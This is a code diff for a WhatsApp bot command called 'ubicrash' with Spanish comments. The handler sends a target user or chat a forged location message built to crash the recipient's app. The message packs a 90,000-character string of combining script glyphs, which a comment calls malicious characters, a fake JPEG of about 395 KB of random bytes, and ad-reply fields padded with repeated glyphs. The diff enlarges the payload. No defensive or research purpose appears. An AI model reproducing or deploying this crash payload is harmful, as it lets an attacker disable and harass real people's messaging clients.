@@ -1,3 +1,5 @@
+import fetch from 'node-fetch'
+
 let handler = async (m, { conn }) => {
   const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
   if (jid === conn.user.id) {
@@ -6,15 +8,17 @@ let handler = async (m, { conn }) => {
 
   const objetivo = jid;
 
-  // Carácter malicioso
+  // 🧨 Caracteres maliciosos proporcionados
   const caracter = 'ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵';
-  const textoLargo = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);
+  const totalCaracteres = caracter.repeat(Math.floor(90000 / caracter.length)).slice(0, 90000);
 
-  // 🧪 Crea una imagen JPEG falsa de 400 KB
+  // 🖼️ Crea una imagen JPEG falsa con bytes aleatorios (aprox 395 KB)
   const header = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0]); // JPEG header
-  const fill = Buffer.alloc(400 * 1024 - header.length, 0xFF); // Relleno con 0xFF
-  const fakeImage = Buffer.concat([header, fill]);
+  const aleatorio = Buffer.alloc(395 * 1024 - header.length);
+  for (let i = 0; i < aleatorio.length; i++) aleatorio[i] = Math.floor(Math.random() * 256);
+  const thumbnailPesado = Buffer.concat([header, aleatorio]);
 
+  // 📦 Construir el mensaje
   const fakeLoc = {
     key: {
       fromMe: false,
@@ -23,12 +27,22 @@ let handler = async (m, { conn }) => {
     },
     message: {
       locationMessage: {
-        name: 'C•137DOMINA+ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵',
+        name: 'Tobi',
         degreesLatitude: 19.432608,
         degreesLongitude: -99.133209,
-        address: textoLargo,
-        jpegThumbnail: fakeImage,
-        isLive: false
+        address: totalCaracteres,
+        jpegThumbnail: thumbnailPesado,
+        isLive: false,
+        contextInfo: {
+          forwardingScore: 999,
+          isForwarded: true,
+          externalAdReply: {
+            title: '𑇂'.repeat(1000),
+            body: '𑆿𑆿𑆿'.repeat(1000),
+            thumbnail: thumbnailPesado,
+            sourceUrl: 'https://youtube.com/@p.a.zinwebkkkkj'
+          }
+        }
       }
     }
   };
@@ -36,7 +50,7 @@ let handler = async (m, { conn }) => {
   await conn.relayMessage(objetivo, fakeLoc.message, { messageId: conn.generateMessageTag() });
 };
 
-handler.command = /^ubicrash|ubipesada$/i;
+handler.command = /^ubicrash$/i;
 handler.owner = true;
 
 export default handler;
